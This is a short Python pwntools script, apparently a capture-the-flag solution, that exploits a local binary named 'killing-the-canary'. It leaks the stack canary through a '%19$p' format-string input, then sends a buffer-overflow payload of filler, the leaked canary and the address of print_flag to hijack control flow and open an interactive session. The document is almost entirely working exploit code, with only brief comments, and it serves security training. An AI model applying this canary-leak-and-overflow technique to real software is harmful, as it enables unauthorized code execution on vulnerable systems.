#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
# leak the canary at offset 19
r.sendline(b"%19$p")

val = r.recvuntil(b"What's your message? ")
log.info(val)

# parse the canary
leaked = re.findall(b"0x([0-9a-f]+)", val)
canary = int(leaked[0], 16)
log.info(f"Canary: {canary:#x}")

win = exe.symbols['print_flag']
log.info(f"print_flag address: {win:#x}")

# message[64] + canary + saved_rbp + return_address
payload = b"A" * 72  
payload += p64(canary)  
payload += p64(0)  
payload += p64(win)  

r.sendline(payload)

r.recvline()
r.interactive()